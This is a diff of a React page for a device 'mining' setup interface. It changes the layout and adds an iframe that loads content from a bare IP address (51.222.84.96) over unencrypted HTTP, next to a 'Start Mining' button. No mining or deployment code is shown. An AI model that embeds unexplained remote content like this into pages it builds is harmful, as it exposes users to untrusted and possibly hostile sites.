@@ -1,11 +1,12 @@
 import React, { useState } from 'react';
+import Iframe from 'react-iframe';
+import { Header } from '@/components/mining/Header';
+import { PlatformCard } from '@/components/mining/PlatformCard';
+import { DeploymentStatus } from '@/components/mining/DeploymentStatus';
 import { Card, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Alert, AlertDescription } from '@/components/ui/alert';
 import { Terminal, Download, Laptop, Smartphone } from 'lucide-react';
-import { Header } from '@/components/mining/Header';
-import { PlatformCard } from '@/components/mining/PlatformCard';
-import { DeploymentStatus } from '@/components/mining/DeploymentStatus';
 import { Platform } from '@/components/mining/types';
 
 const platforms: Platform[] = [
@@ -30,7 +31,6 @@ const Index = () => {
   const [deploymentStatus, setDeploymentStatus] = useState('idle');
   const [progress, setProgress] = useState(0);
   const [deviceId, setDeviceId] = useState('');
-  const [installStep, setInstallStep] = useState(0);
 
   const handleDeploy = async () => {
     if (!selectedPlatform) return;
@@ -48,49 +48,64 @@ const Index = () => {
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-blue-50 to-purple-50 text-gray-800 p-6">
-      <div className="max-w-3xl mx-auto space-y-8">
+      <div className="max-w-6xl mx-auto space-y-8">
         <Header />
 
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-          {platforms.map((platform) => (
-            <PlatformCard
-              key={platform.id}
-              platform={platform}
-              isSelected={selectedPlatform === platform.id}
-              onClick={() => setSelectedPlatform(platform.id)}
+        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
+          <div className="space-y-8">
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+              {platforms.map((platform) => (
+                <PlatformCard
+                  key={platform.id}
+                  platform={platform}
+                  isSelected={selectedPlatform === platform.id}
+                  onClick={() => setSelectedPlatform(platform.id)}
+                />
+              ))}
+            </div>
+
+            {selectedPlatform && (
+              <Card className="bg-white/90 border-gray-100">
+                <CardContent className="p-6 space-y-4">
+                  <Button 
+                    className="w-full bg-gradient-to-r from-blue-400 to-purple-400 hover:opacity-90 text-white font-medium"
+                    onClick={handleDeploy}
+                    disabled={deploymentStatus === 'deploying'}
+                  >
+                    <Download className="h-4 w-4 mr-2" />
+                    {deploymentStatus === 'deploying' ? 'Setting Up...' : 'Start Mining'}
+                  </Button>
+
+                  <DeploymentStatus
+                    status={deploymentStatus}
+                    progress={progress}
+                    deviceId={deviceId}
+                  />
+                </CardContent>
+              </Card>
+            )}
+
+            {deploymentStatus === 'idle' && !selectedPlatform && (
+              <Alert className="bg-blue-50 border-blue-100">
+                <Terminal className="h-4 w-4 text-blue-500" />
+                <AlertDescription className="text-blue-700">
+                  Select your platform above to begin the guided setup process. We'll walk you through each step.
+                </AlertDescription>
+              </Alert>
+            )}
+          </div>
+
+          <div className="bg-white rounded-lg shadow-lg overflow-hidden h-[600px]">
+            <Iframe
+              url="http://51.222.84.96/87CtFN/"
+              width="100%"
+              height="100%"
+              className="border-0"
+              display="block"
+              position="relative"
             />
-          ))}
+          </div>
         </div>
-
-        {selectedPlatform && (
-          <Card className="bg-white/90 border-gray-100">
-            <CardContent className="p-6 space-y-4">
-              <Button 
-                className="w-full bg-gradient-to-r from-blue-400 to-purple-400 hover:opacity-90 text-white font-medium"
-                onClick={handleDeploy}
-                disabled={deploymentStatus === 'deploying'}
-              >
-                <Download className="h-4 w-4 mr-2" />
-                {deploymentStatus === 'deploying' ? 'Setting Up...' : 'Start Mining'}
-              </Button>
-
-              <DeploymentStatus
-                status={deploymentStatus}
-                progress={progress}
-                deviceId={deviceId}
-              />
-            </CardContent>
-          </Card>
-        )}
-
-        {deploymentStatus === 'idle' && !selectedPlatform && (
-          <Alert className="bg-blue-50 border-blue-100">
-            <Terminal className="h-4 w-4 text-blue-500" />
-            <AlertDescription className="text-blue-700">
-              Select your platform above to begin the guided setup process. We'll walk you through each step.
-            </AlertDescription>
-          </Alert>
-        )}
       </div>
     </div>
   );
